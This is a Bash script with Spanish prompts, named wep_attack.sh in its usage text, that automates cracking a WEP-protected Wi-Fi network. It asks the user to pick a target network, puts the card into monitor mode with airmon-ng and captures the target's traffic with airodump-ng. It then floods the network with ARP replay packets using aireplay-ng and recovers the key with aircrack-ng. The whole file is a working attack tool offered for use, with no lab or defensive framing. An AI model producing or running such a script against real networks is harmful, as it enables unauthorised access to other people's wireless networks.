#!/bin/bash

if [ $# -eq 1 ]; then
	interfaz=$1
	echo "[+] Lenvantando la interfaz $interfaz a modo monitor....."
	airmon-ng check kill
	airmon-ng start $interfaz
	echo "[+] Busca la red a vulnerar: "

	rm archivo &>/dev/null

	gnome-terminal -- airodump-ng wlan0mon -w archivo --output-format csv &
	read ssid

	channel=$(cat archivo-01.csv | grep "$ssid" | awk '{print $6}' | tr -d ',')
	mac=$(cat archivo-01.csv | grep "$ssid" | awk '{print $1}' | tr -d ',')

	echo "[+] $interfaz $channel $mac"

	rm archivo* &>/dev/null
	gnome-terminal -- airodump-ng --channel $channel --bssid $mac wlan0mon -w archivo --output-format csv
	#sleep 5

	mac_cliente=$(cat archivo-01.csv | tail -n 2 | awk '{print $1}' | tr -d ',')

	rm archivo* &>/dev/null

	echo $mac_cliente
	#ifconfig
	xterm -hold -e airodump-ng --channel $channel --bssid $mac --write wep_crack wlan0mon &

	sleep 5

	xterm -hold -e aireplay-ng --arpreplay -h "$mac_cliente" -b "$mac" wlan0mon &

	sleep 130

	aircrack-ng -b "$mac" wep_crack-01.cap

	rm wep_crack* &>/dev/null
	rm replay* &>/dev/null

	airmon-ng stop wlan0mon
	service NetworkManager restart
else
	echo "[!] Ejecutar asi:"
	echo -e "\tsudo ./wep_attack.sh interfaz"
	echo "[+] Interfaces: "
	ifconfig | grep ": f" | awk '{print $1}' | tr -d ':'
fi
